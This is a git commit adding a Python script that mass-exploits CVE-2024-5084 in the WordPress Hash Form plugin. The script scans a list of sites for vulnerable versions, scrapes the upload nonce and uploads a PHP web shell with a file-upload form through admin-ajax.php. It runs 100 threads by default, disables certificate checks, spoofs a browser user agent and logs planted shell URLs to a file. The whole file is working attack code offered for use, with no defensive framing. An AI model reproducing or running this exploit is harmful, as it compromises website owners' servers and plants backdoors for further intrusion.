dcac4d8ee99cd5a98496c4ea768b09a4ed030d76
KILL THE NET <33407405+KTN1990@users.noreply.github.com>
2024-05-31 20:51:13 +0100

    Add files via upload

---
+++ hash.py
@@ -0,0 +1,92 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*
+from re import findall
+from argparse import ArgumentParser
+from random import getrandbits
+from concurrent.futures import ThreadPoolExecutor
+from threading import Lock
+from requests import Session
+__import__('warnings').simplefilter('ignore',Warning)
+
+#i dont do typing in simple python scripts cs am no diddy so dont be diddy use typin only on "big" code (no diddy :D)
+
+class CVE_2024_5084:
+
+    def Save(self, file, data):
+        with self.Lock:
+            with open(file, 'a') as f:
+                f.write(f"{data}\n")
+
+    def Getnonce(self, url):
+        try:
+            r = self.session.get(url).text
+            #nounce wtf is nounce!
+            return findall(r'hashform_vars\s*.*=\s*.*"ajax_nounce":"(.*?)"', r)[0]
+        except:
+            return None
+
+    def Exploit(self, url):
+        name   = f"{getrandbits(32)}.php"
+        if nonce := self.Getnonce(url):
+            params = {
+                    "action": "hashform_file_upload_action",
+                    "file_uploader_nonce": nonce,
+                    "allowedExtensions[0]": "php",
+                    "sizeLimit": 69696969,
+                    "qqfile": name,
+                }
+            r = self.session.post(f"{url}wp-admin/admin-ajax.php", params=params, data=self.shell).text
+            if '"success":true,' in r:
+                print(f" [ LOG ] (SHELL UPLOADED) {url}")
+                return self.Save("__shells__.txt", f"{url}/wp-content/uploads/hashform/temp/{name}")
+        print(f" [ LOG ] (SHELL NOT UPLOADED) {url}")
+
+    def Scan(self, url):
+        url = f"{'http://' if not url.lower().startswith(('http://', 'https://')) else ''}{url}{'/' if not url.endswith('/') else ''}"
+        print(f" [ LOG ] (CHECKING) {url}")
+        try:
+            r = self.session.get(f"{url}wp-content/plugins/hash-form/readme.txt").text
+            if 'hashthemes' in r and "1.1.1" not in r:
+                print(f" [ LOG ] (VULN) {url}")
+                self.Save("__vuln__.txt", url)
+                return self.Exploit(url)
+            print(f" [ LOG ] (NOT VULN) {url}")
+        except:
+            print(f" [LOG] EXCEPTION ERROR ({url})")
+
+    def __init__(self, Lock):
+        self.Lock  = Lock
+        self.shell = '''<?php error_reporting(0);echo("kill_the_net<form method='POST' enctype='multipart/form-data'><input type='file'name='f' /><input type='submit' value='up' /></form>");@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);echo("<a href=".$_FILES['f']['name'].">".$_FILES['f']['name']."</a>");?>'''
+        self.session = Session()
+        self.session.verify  = False
+        self.session.timeout = (20,40)
+        self.session.allow_redirects = True
+        self.session.max_redirects = 5
+        self.session.headers.update({"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0"})
+
+if __name__ == '__main__':
+    print('''
+
+
+    db   d8b   db d8888b.      d88888b db    db d8888b. 
+    88   I8I   88 88  `8D      88'     `8b  d8' 88  `8D 
+    88   I8I   88 88oodD'      88ooooo  `8bd8'  88oodD' 
+    Y8   I8I   88 88~~~        88~~~~~  .dPYb.  88~~~   
+    `8b d8'8b d8' 88           88.     .8P  Y8. 88      
+     `8b8' `8d8'  88           Y88888P YP    YP 88      
+                                                TG: @KtN_1990
+
+        ''')
+
+    parser = ArgumentParser()
+    parser.add_argument('-l', '--list', help="Path of list site", required=True)
+    parser.add_argument('-t', '--threads', type=int, help="threads number", default=100)
+    args = parser.parse_args()
+    try:
+        with open(args.list, 'r') as f: urls = list(set(f.read().splitlines()))
+        ExpObj = CVE_2024_5084(Lock())
+        with ThreadPoolExecutor(max_workers=int(args.threads)) as pool:
+            [pool.submit(ExpObj.Scan, url) for url in urls]
+    except Exception as e:
+        print(e)
+        print(" [LOG] EXCEPTION ERROR @ MAIN FUNC")
